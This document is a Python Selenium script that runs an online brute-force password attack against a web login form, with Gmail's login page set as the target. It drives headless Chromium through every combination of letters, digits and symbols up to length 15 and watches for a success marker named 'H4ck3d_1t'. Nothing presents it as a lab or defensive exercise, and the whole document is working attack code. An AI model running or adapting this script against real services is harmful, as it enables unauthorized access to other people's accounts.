from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import string
import itertools

# Path to your Chromium binary
CHROMIUM_PATH = "/usr/bin/chromium"  # Add path to Chromium binary here

# Configure your target URL and input field details
URL = "https://gmail.com/login"  # Replace with the actual URL
INPUT_BOX_ID = "password"        # Replace with the actual input box ID
SUCCESS_TEXT = "H4ck3d_1t"       # Replace with the success indicator (e.g., "Login successful")

# Function to generate characters
def generate_passwords(charset, length):
    return (''.join(candidate) for candidate in itertools.product(charset, repeat=length))

# Main function to automate testing
def test_passwords():
    # Initialize the web driver (use the appropriate driver for your browser)
    options = webdriver.ChromeOptions()
    options.binary_location = CHROMIUM_PATH  # Specify the Chromium binary location

    # Add arguments for headless mode and other fixes
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--remote-debugging-port=9222")

    service = Service(executable_path='/usr/bin/chromedriver')  # Update the path if needed
    driver = webdriver.Chrome(service=service, options=options)
    
    driver.get(URL)

    # Define the character set
    charset = string.ascii_letters + string.digits
    special_characters = "!@#$%^&*()-_=+[]{}|;:',.<>?/~`"  # Custom special characters
    charset += special_characters  # Combine all character sets

    max_length = 15  # Set max password length for testing

    for length in range(1, max_length + 1):
        for password in generate_passwords(charset, length):
            try:
                # Find the input box and enter the password
                input_box = driver.find_element(By.ID, INPUT_BOX_ID)
                input_box.clear()
                input_box.send_keys(password)
                input_box.send_keys(Keys.RETURN)

                # Wait for the response (adjust as needed)
                time.sleep(1)

                # Check for success indication
                if SUCCESS_TEXT in driver.page_source:
                    print(f"Password found: {password}")
                    driver.quit()
                    return
                else:
                    print(f"Tried: {password} - Incorrect")
            except Exception as e:
                print(f"Error: {e}")
                driver.quit()
                return

    print("Password not found within the given constraints.")
    driver.quit()

# Run the script
if __name__ == "__main__":
    test_passwords()
